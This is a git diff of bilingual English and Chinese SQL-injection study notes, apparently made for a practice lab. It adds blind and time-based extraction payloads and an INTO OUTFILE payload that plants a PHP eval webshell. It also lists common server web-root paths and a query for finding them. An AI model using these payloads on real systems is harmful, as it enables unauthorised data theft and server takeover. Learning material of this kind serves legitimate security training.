@@ -50,16 +50,23 @@ select name, password from users where id = 1 and 1 = 0 union select database(),
 [What's in information_schema.columns?](https://dev.mysql.com/doc/refman/5.7/en/columns-table.html)  
 **group_concat() is also a litte trick.**
 
-### Blind based   
+### Blind based  
 When we cannot show results what we want, we still can find whether it exists or not.  
 **True**: Web page shows normal.  
-**False**: Web page shows error or blank.  
-```sql  
-... exists (select * from table);  // 配合 AND使用
+**False**: Web page shows error or blank.  
+**Boolean based**  
+```sql
+length(str)
+substr(str,pos,len)   // start index is 1 !!, mid(str,pos,len)
+ascii(str)    // we will get decimal,ord()
+if(a,b,c)   // if a is true, return b, otherwise return c
+id=1' and ascii(substr((select database()),1,1))>65--+
 ```
-
-### Time based  
-Wait for my first time practice ><...
+Blind-based會花非常多時間，所以可以自己寫script來代替手注! (有時間會把盲注腳本搞出來上傳><  
+**Time based**  
+```sql
+id=1' and if(ascii(substr((select database()),1,1)>115),0,sleep(5))--+  // if 第一個字非s以後的字母 則延遲5秒
+```
   
 ### Error based  
 * Analyze the error message  
@@ -113,8 +120,28 @@ WAF is a defender for web.
 - Encode your payload  
   - ```URL-ENCODE, HEXIDECIMAL, UNICODE```
   
-### Webshell  
-Based on the provilege of db user, we can upload shell to read or write to db.  
+### Dump file  
+將查詢結果放到文件中, 或者將一句話木馬放到系統上的php文件中  
+```sql
+1' or 1 union select 1,2,"<?php @eval($_POST['hi']);?>" into outfile 'C://xampp/htdocs/sqli/Less-9/muma.php'--+ // 絕對路徑
+// 注意前面的語句必須用雙引號處理
+```  
+熟悉各系統引擎的路徑有助於猜測...  
+```php
+// winserver IIS 下的 asp server
+C:\inetpub\www\root\
+// linux server 上 nginx
+/usr/local/nginx/html, /home/www/root/default, /usr/share/nginx, /var/www/html
+// limux 上 apache
+/var/www/html, /var/www/html/htdocs
+```  
+或者從能輸出結果的頁面得到路徑...  
+```sql
+// @@basedir : sql 安裝路徑
+// @@datadir : 數據庫安裝路徑
+id=1' union select 1, @@basedir, @@datadir--+
+```
+e.g. @@basedir 我們得到```C:/xampp/mysql```的結果, 而網頁根目錄路徑便是```C:/xampp/htdocs/```
   
 ### Trick of Pentesting  
 Here are some tricks of pentesting, step by step from find the vulnerability to exploit it!  
